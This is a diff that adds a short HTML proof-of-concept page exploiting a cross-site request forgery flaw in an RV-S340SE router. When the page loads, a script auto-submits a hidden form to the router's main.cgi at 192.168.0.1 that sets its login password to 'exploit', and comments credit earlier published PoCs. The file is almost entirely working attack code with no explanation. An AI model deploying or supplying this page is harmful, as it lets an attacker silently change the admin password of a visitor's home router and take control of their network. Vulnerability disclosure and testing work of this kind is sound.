@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <title>RV-S340SE CSRF(change password) PoC</title>
+  <script>
+    // Modified Proof of Concept(PoC) on http://d.hatena.ne.jp/kaito834/20141120
+    // Based on http://qiita.com/gaogao_9/items/ec2b867d6941173fd0b1
+    document.addEventListener("DOMContentLoaded", function(){
+      document.getElementById('form0').submit();
+      // console.log("Exploited")
+    }, false)
+  </script>
+</head>
+<body>
+  <form id="form0" action="http://192.168.0.1/cgi-bin/main.cgi" method="post">
+    <input type="hidden" name="mbg_webname" value="loginpass_user_input">
+    <input type="hidden" name="config_no" value="1">
+    <input type="hidden" name="loginpass_user_pass" value="exploit">
+    <input type="hidden" name="loginpass_user_passcfm" value="exploit">
+    <input type="hidden" name="mbg_set" value="設定">
+    <input type="submit" value="exploit">
+  </form>
+</body>
+</html>
